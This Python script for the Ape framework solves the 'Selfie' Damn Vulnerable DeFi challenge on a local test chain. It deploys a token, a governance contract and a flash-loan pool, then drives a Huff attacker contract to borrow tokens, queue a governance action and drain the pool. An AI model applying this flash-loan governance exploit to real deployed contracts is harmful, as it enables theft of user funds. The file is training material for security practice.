from ape import accounts, project
from eth_abi import encode
from ..utils.helper import (
    w3,
    time_travel,
    get_sig,
    send_tx,
    deploy_huff_contract,
)

TOKEN_INITIAL_SUPPLY = w3.to_wei(2_000_000, "ether")
TOKENS_IN_POOL = w3.to_wei(1_500_000, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    print(
        f"\n--- \nOur players:\n⇒ Deployer: {deployer}\n⇒ Attacker: {attacker}\n---\n"
    )

    # deploy token and lender contracts
    print("\n--- Deploying Token, Governance and Pool contracts ---\n")
    token = project.DamnValuableTokenSnapshot.deploy(
        TOKEN_INITIAL_SUPPLY, sender=deployer
    )
    governance = project.SimpleGovernance.deploy(token, sender=deployer)
    assert governance.getActionCounter() == 1
    pool = project.SelfiePool.deploy(token, governance, sender=deployer)
    assert pool.token() == token
    assert pool.governance() == governance

    # fund the pool
    print("\n--- Funding Pool with tokens ---\n")
    token.transfer(pool, TOKENS_IN_POOL, sender=deployer)
    token.snapshot(sender=deployer)
    assert token.balanceOf(pool) == TOKENS_IN_POOL
    assert pool.maxFlashLoan(token) == TOKENS_IN_POOL
    assert pool.flashFee(token, 0) == 0

    # define intial balances for pool and attacker
    pool_initial_bal = token.balanceOf(pool) / 10**18
    attacker_initial_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Pool: {pool_initial_bal}\n⇒ Attacker: {attacker_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # do flashloan and queue action
    attacker_contract = deploy_huff_contract("SelfieAttacker.huff", b"", attacker)

    send_tx(
        attacker,
        attacker_contract,
        get_sig("start_attack(address,address,address)")
        + encode(
            ["address", "address", "address"],
            [pool.address, token.address, governance.address],
        ).hex(),
    )

    # wait until you can take action in governance
    time_travel(governance.getActionDelay())

    # finish attack
    send_tx(attacker, attacker_contract, get_sig("finish_attack()"))

    # --- AFTER EXPLOIT --- #
    print(
        "\n--- After exploit: attacker should have stolen all tokens in the pool ---\n"
    )

    # define ending balances for pool and attacker
    pool_ending_bal = token.balanceOf(pool) / 10**18
    attacker_ending_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nEnding Balances:\n⇒ Pool: {pool_ending_bal}\n⇒ Attacker: {attacker_ending_bal}\n---\n"
    )

    # attacker has taken all tokens from pool
    assert token.balanceOf(attacker) == TOKENS_IN_POOL
    assert token.balanceOf(pool) == 0

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
